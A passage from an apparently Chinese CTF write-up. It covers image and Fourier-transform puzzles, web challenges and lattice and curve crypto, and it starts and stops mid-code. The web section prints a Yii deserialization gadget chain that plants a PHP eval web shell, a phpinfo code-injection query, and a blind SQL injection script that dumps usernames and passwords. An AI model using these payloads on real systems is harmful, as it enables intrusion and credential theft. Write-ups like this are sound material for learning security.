class="number">0xff</span>,<span class="number">0xff</span>),(<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x00</span>),(<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xc0</span>),(<span class="number">0x00</span>,<span class="number">0xc0</span>,<span class="number">0x00</span>),(<span class="number">0x00</span>,<span class="number">0xc0</span>,<span class="number">0xc0</span>),(<span class="number">0xc0</span>,<span class="number">0xff</span>,<span class="number">0xff</span>),(<span class="number">0xc0</span>,<span class="number">0xff</span>,<span class="number">0xc0</span>),(<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xff</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(color))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data1&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">37</span>,<span class="number">191</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    tmp = f.read(<span class="number">1</span>)</span><br><span class="line">    flag = [] ; tmp_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> tmp != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> tmp != <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            tmp_str += tmp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(tmp_str,<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">in</span> flag:</span><br><span class="line">                flag.append(<span class="built_in">int</span>(tmp_str,<span class="number">10</span>))</span><br><span class="line">            pixel = color[<span class="built_in">int</span>(tmp_str,<span class="number">10</span>)]</span><br><span class="line">            img.putpixel((num // <span class="number">191</span> ,num % <span class="number">191</span>),pixel)</span><br><span class="line">            tmp_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        tmp = f.read(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    img.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>得到一张图片，图片的样子加上题目名可以想到是 npiet 语言，用 npiet 解一下图片就可以了</p>
<h3 id="PicPic"><a href="#PicPic" class="headerlink" title="PicPic"></a>PicPic</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p>这里第一关看出题人给的脚本可以知道，出题人把原视频切割成帧图像之后，对每帧画面进行了傅里叶变换的处理，然后分别保存幅度图和相位图，其中幅度图的最大最小值都写在文件 r 里。</p>
<p>这里做题的时候暂时没想明白一点是：根据出题人的脚本可知，原视频切割了多少帧，for循环就执行多少次，相应的r文件中的数据也就被写入多少次，计算可知r文件被写入80次，也就是源png应该是80个，这里因为合并的时候出题人设置每秒25帧，所以合并后的视频是200帧，这种情况下，忽略了这一点反而也能解出正确图像是没想到的，暂时不理解为什么可以解出。这不逻辑</p>
<p>总之写出脚本对出题人输出的mkv进行反向操作可以得到源视频切割后的图像，能够在图像中看到下一关的压缩密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapping</span>(<span class="params">data, down=<span class="number">0</span>, up=<span class="number">255</span>, tp=np.uint8</span>):</span></span><br><span class="line">    data_max = data.<span class="built_in">max</span>()</span><br><span class="line">    data_min = data.<span class="built_in">min</span>()</span><br><span class="line">    interval = data_max - data_min</span><br><span class="line">    new_interval = up - down</span><br><span class="line">    new_data = (data - data_min) * new_interval / interval + down</span><br><span class="line">    new_data = new_data.astype(tp)</span><br><span class="line">    <span class="keyword">return</span> new_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    files = os.listdir(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        m = cv2.imread(<span class="string">f&#x27;m/<span class="subst">&#123;file&#125;</span>&#x27;</span>,cv2.IMREAD_GRAYSCALE)</span><br><span class="line">        p = cv2.imread(<span class="string">f&#x27;p/<span class="subst">&#123;file&#125;</span>&#x27;</span>,cv2.IMREAD_GRAYSCALE)</span><br><span class="line">        r = struct.unpack(<span class="string">&#x27;!ff&#x27;</span>,f.read(<span class="number">8</span>))</span><br><span class="line">        Min = <span class="built_in">float</span>(r[<span class="number">0</span>])</span><br><span class="line">        Max = <span class="built_in">float</span>(r[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        m = mapping(m,Min,Max,np.float64)</span><br><span class="line">        p = mapping(p,-np.pi, np.pi,np.float64)</span><br><span class="line">        m = np.exp(m)</span><br><span class="line"></span><br><span class="line">        img = (m*np.cos(p)) + (m * np.sin(p) * <span class="number">1j</span>)</span><br><span class="line">        img = np.fft.ifftshift(img)</span><br><span class="line">        img = np.fft.ifft2(img)</span><br><span class="line">        img = mapping(img)</span><br><span class="line"></span><br><span class="line">        cv2.imwrite(<span class="string">f&#x27;frame/<span class="subst">&#123;file&#125;</span>&#x27;</span>,img)</span><br></pre></td></tr></table></figure>
<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p>给了一个hint，里面是mathML语言，直接html解析一下得到一个数学表达式，结合傅里叶变换可知是提示图像相位互换。脚本：</p>
<p>得到原二维码，扫码得到一串不明十六进制，猜测密文，先去下一关</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fft</span>(<span class="params">img</span>):</span></span><br><span class="line">    fft = np.fft.fft2(img)</span><br><span class="line">    m = np.<span class="built_in">abs</span>(fft)</span><br><span class="line">    p = np.angle(fft)</span><br><span class="line">    <span class="keyword">return</span> m, p</span><br><span class="line"></span><br><span class="line">img1 = cv2.imread(<span class="string">&#x27;mix1.png&#x27;</span>, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">img2 = cv2.imread(<span class="string">&#x27;mix2.png&#x27;</span>, cv2.IMREAD_GRAYSCALE)</span><br><span class="line"></span><br><span class="line">m1,p1 = fft(img1)</span><br><span class="line">m2,p2 = fft(img2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exchange phase</span></span><br><span class="line">m1_p2 = m1*np.cos(p2) + m1*np.sin(p2)*<span class="number">1j</span></span><br><span class="line">m2_p1 = m2*np.cos(p1) + m2*np.sin(p1)*<span class="number">1j</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m1_p2 = np.fft.ifft2(m1_p2)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;test1.png&#x27;</span>,np.uint8(m1_p2))</span><br><span class="line">m2_p1 = np.fft.ifft2(m2_p1)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;test2.png&#x27;</span>,np.uint8(m2_p1))</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;123.png&#x27;</span>)</span><br><span class="line">x,y = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        pixel = img.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> pixel &gt;= <span class="number">230</span>:</span><br><span class="line">            img.putpixel((i,j),<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">img.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">x,y = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        pixel = img.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> pixel &gt;= <span class="number">50</span>:</span><br><span class="line">            img.putpixel((i,j),<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">img.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p>一张看上去满是噪点的图片，结合本题前两关可知，这应该是频谱图，考虑到幅度图还原不了原图，所以应该是相位图还原原图。脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapping</span>(<span class="params">data, down=<span class="number">0</span>, up=<span class="number">255</span>, tp=np.uint8</span>):</span></span><br><span class="line">    data_max = data.<span class="built_in">max</span>()</span><br><span class="line">    data_min = data.<span class="built_in">min</span>()</span><br><span class="line">    interval = data_max - data_min</span><br><span class="line">    new_interval = up - down</span><br><span class="line">    new_data = (data - data_min) * new_interval / interval + down</span><br><span class="line">    new_data = new_data.astype(tp)</span><br><span class="line">    <span class="keyword">return</span> new_data</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">&#x27;phase.png&#x27;</span>, cv2.IMREAD_UNCHANGED)</span><br><span class="line"></span><br><span class="line">img = mapping(img,-np.pi,np.pi)</span><br><span class="line">img = np.exp(<span class="number">1j</span>*img)</span><br><span class="line">img = np.fft.ifftshift(img)</span><br><span class="line">img = np.fft.ifft2(img)</span><br><span class="line">img = np.<span class="built_in">abs</span>(img)</span><br><span class="line">img = mapping(img)</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;test.png&#x27;</span>,img.astype(np.uint8))</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;test.png&#x27;</span>)</span><br><span class="line">x,y = img.size</span><br><span class="line">test_img = Image.new(<span class="string">&#x27;L&#x27;</span>,(x,y))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">        pixel = img.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> pixel &lt; <span class="number">2</span>:</span><br><span class="line">            test_img.putpixel((i,j),<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">test_img.save(<span class="string">&quot;key.png&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>robots.txt 提示1ndexx.php<br>.1ndexx.php.swp拿到源码 ?code=&lt;?=phpinfo();?&gt;<br> hack.php中搜索flag，找到flag</p>
<h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p>www.zip 下载源码，本地搭环境查看版本是yii 2.0.38<br>审计发现actionAbout存在反序列化，网上搜索找到链子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&quot;file_put_contents(&#x27;cop.php&#x27;,base64_decode(&#x27;PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NvcCddKTs=&#x27;));&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//file_put_contents(&#x27;cop.php&#x27;,base64_decode(&#x27;PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NvcCddKTs=&#x27;));</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>本地用system一直失败所以尝试用assert 写shell<br>写入shell之后蚁剑连接，发现根目录存在readflag，Disable_functions禁用了系统函数，用蚁剑的绕过插件apache_mod_cgi模板一键绕过执行readflag</p>
<h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>主页加载图片 image.php发现注入点<br>注入Exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line">n=<span class="number">2</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">27</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    m=<span class="number">64</span></span><br><span class="line">    j=<span class="number">64</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> q!=<span class="number">1</span>:</span><br><span class="line">            j=j/<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">                m=m+j</span><br><span class="line">            <span class="keyword">elif</span> n==<span class="number">0</span>:</span><br><span class="line">                m=m-j</span><br><span class="line">        m=<span class="built_in">int</span>(m)</span><br><span class="line">        <span class="comment">#exp=&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot; .format (i,m)</span></span><br><span class="line">        <span class="comment">#exp=&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format (i,m)</span></span><br><span class="line">        exp=<span class="string">&quot;1^(ascii(substr((select(group_concat(username,password))from(users)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>.<span class="built_in">format</span>(i,m)</span><br><span class="line">        url=<span class="string">&#x27;http://eci-2ze8j3xqhbs4re3pkykz.cloudeci1.ichunqiu.com/image.php?id=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(exp)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        p=requests.get(url,timeout=<span class="number">100</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(p.text)&gt;<span class="number">1</span>:</span><br><span class="line">            n=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> q==<span class="number">7</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(p.text)&gt;<span class="number">1</span>:</span><br><span class="line">                flag=flag+<span class="built_in">chr</span>(m+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag=flag+<span class="built_in">chr</span>(m)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>注出账号密码admin/db83298098fb07d4ee64c 登陆后发现host参数支持file协议可以读取本地文件，读取file:///flag 拿到flag</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Primegame"><a href="#Primegame" class="headerlink" title="Primegame"></a>Primegame</h3><p>原题改的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="built_in">int</span>(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">100</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">    keys.append(Decimal(<span class="built_in">int</span>(primes[i])).ln())</span><br><span class="line"></span><br><span class="line">arr = []</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> keys:</span><br><span class="line">    arr.append(<span class="built_in">int</span>(v * <span class="built_in">int</span>(<span class="number">16</span>) ** <span class="built_in">int</span>(<span class="number">64</span>)))</span><br><span class="line"></span><br><span class="line">ct = <span class="number">597952043660446249020184773232983974017780255881942379044454676980646417087515453</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">res</span>):</span></span><br><span class="line">    h = Decimal(<span class="built_in">int</span>(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(keys)):</span><br><span class="line">        h += res[i] * keys[i]</span><br><span class="line"></span><br><span class="line">    ct = <span class="built_in">int</span>(h * <span class="built_in">int</span>(<span class="number">16</span>)**<span class="built_in">int</span>(<span class="number">64</span>))</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">N</span>):</span></span><br><span class="line">    ln = <span class="built_in">len</span>(arr)</span><br><span class="line">    A = Matrix(ZZ, ln + <span class="number">1</span>, ln + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ln):</span><br><span class="line">        A[i, i] = <span class="number">1</span></span><br><span class="line">        A[i, ln] = arr[i] // N</span><br><span class="line">        A[ln, i] = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    A[ln, ln] = ct // N</span><br><span class="line"></span><br><span class="line">    res = A.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ln + <span class="number">1</span>):</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ln):</span><br><span class="line">            <span class="keyword">if</span> -<span class="number">64</span> &lt;= res[i][j] &lt; <span class="number">64</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            vec = [<span class="built_in">int</span>(v + <span class="number">64</span>) <span class="keyword">for</span> v <span class="keyword">in</span> res[i][:-<span class="number">1</span>]]</span><br><span class="line">            ret = encrypt(vec)</span><br><span class="line">            <span class="keyword">if</span> ret == ct:</span><br><span class="line">                <span class="built_in">print</span>(N, <span class="built_in">bytes</span>(vec))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>, ret, <span class="built_in">bytes</span>(vec))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">f(i)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="built_in">int</span>(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">100</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">    keys.append(Decimal(<span class="built_in">int</span>(primes[i])).ln())</span><br><span class="line"></span><br><span class="line">arr = []</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> keys:</span><br><span class="line">    arr.append(<span class="built_in">int</span>(v * <span class="built_in">int</span>(<span class="number">16</span>) ** <span class="built_in">int</span>(<span class="number">64</span>)))</span><br><span class="line"></span><br><span class="line">ct = <span class="number">425985475047781336789963300910446852783032712598571885345660550546372063410589918</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">res</span>):</span></span><br><span class="line">    h = Decimal(<span class="built_in">int</span>(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(keys)):</span><br><span class="line">        h += res[i] * keys[i]</span><br><span class="line"></span><br><span class="line">    ct = <span class="built_in">int</span>(h * <span class="built_in">int</span>(<span class="number">16</span>)**<span class="built_in">int</span>(<span class="number">64</span>))</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">N</span>):</span></span><br><span class="line">    ln = <span class="built_in">len</span>(arr)</span><br><span class="line">    A = Matrix(ZZ, ln + <span class="number">1</span>, ln + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ln):</span><br><span class="line">        A[i, i] = <span class="number">1</span></span><br><span class="line">        A[i, ln] = arr[i] // N</span><br><span class="line">        A[ln, i] = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    A[ln, ln] = ct // N</span><br><span class="line"></span><br><span class="line">    res = A.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ln + <span class="number">1</span>):</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ln):</span><br><span class="line">            <span class="keyword">if</span> -<span class="number">64</span> &lt;= res[i][j] &lt; <span class="number">64</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            vec = [<span class="built_in">int</span>(v + <span class="number">64</span>) <span class="keyword">for</span> v <span class="keyword">in</span> res[i][:-<span class="number">1</span>]]</span><br><span class="line">            ret = encrypt(vec)</span><br><span class="line">            <span class="keyword">if</span> ret == ct:</span><br><span class="line">                <span class="built_in">print</span>(N, <span class="built_in">bytes</span>(vec))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>, ret, <span class="built_in">bytes</span>(vec))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    f(i)</span><br></pre></td></tr></table></figure>
<h3 id="Hpcurve"><a href="#Hpcurve" class="headerlink" title="Hpcurve"></a>Hpcurve</h3><p>原题改的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">K = GF(p)</span><br><span class="line">R.&lt;x&gt; = K[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_u_from_out</span>(<span class="params">output, known_input</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        res.append(output[i]^^known_input[i])</span><br><span class="line">    res = <span class="built_in">bytes</span>(res)</span><br><span class="line">    u0, u1, u2 = struct.unpack(<span class="string">&quot;&lt;QQQ&quot;</span>, res)</span><br><span class="line">    u = x^<span class="number">3</span>+x^<span class="number">2</span>*u2+x*u1+u0</span><br><span class="line">    <span class="keyword">return</span> u</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_v_from_u</span>(<span class="params">u</span>):</span></span><br><span class="line">    Kbar = GF(p^<span class="number">6</span>)</span><br><span class="line">    Rbar.&lt;t&gt; = Kbar[<span class="string">&quot;t&quot;</span>]</span><br><span class="line">    u2 = u.change_ring(Rbar)</span><br><span class="line">    roots = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> u2.roots()]</span><br><span class="line">    ys = []</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">        ys.append(f(root).sqrt(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">    res = []</span><br><span class="line">    